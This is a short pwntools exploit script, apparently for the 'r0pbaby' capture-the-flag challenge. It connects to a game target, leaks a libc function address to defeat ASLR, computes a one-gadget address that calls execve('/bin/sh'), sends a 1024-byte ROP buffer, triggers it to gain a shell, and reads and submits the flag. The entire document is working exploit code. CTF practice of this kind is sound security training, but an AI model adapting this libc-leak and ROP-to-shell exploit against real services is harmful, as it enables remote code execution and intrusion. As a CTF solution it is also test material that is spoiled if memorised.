#!/usr/bin/env python
from pwn import *
context.arch='amd64'

p = remote(get_target_ip(), 10011)

# Game box used libc from Ubuntu 14.04 latest, so this just works
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# Find libc base from a known function address.
# Choice of 'system' is irrelevant.
p.sendline('2')
p.sendline('system')
p.recvuntil('Symbol system: ')

# Calculate libc from function address
system       = int(p.recvline(), 0)
libc.address = system - libc.symbols['system']
log.info('libc: %#x' % libc.address)


"""
.text:000000000004652C 48 8B 05 75 79 37 00           mov     rax, cs:environ_ptr_0
.text:0000000000046533 48 8D 3D A1 67 13 00           lea     rdi, aBinSh     ; "/bin/sh"
.text:000000000004653A 48 8D 74 24 30                 lea     rsi, [rsp+30h]
.text:000000000004653F C7 05 77 A1 37 00 00 00 00 00  mov     cs:dword_3C06C0, 0
.text:0000000000046549 C7 05 7D A1 37 00 00 00 00 00  mov     cs:dword_3C06D0, 0
.text:0000000000046553 48 8B 10                       mov     rdx, [rax]
.text:0000000000046556 E8 D5 AD 07 00                 call    execve
"""
magic        = libc.address + 0x4652C


# Send ROP buffer
p.sendline('3')
p.sendline('1024')

buf = pack(0) + pack(magic)
buf = buf.ljust(1024, '\x00')
p.send(buf)

# Quit, trigger ROP
p.sendline('4')
p.clean(1)

# Have a shell
p.sendline('exec cat /home/r0pbaby/flag;exit')
flag  = p.recvall()
submit_flag(flag)
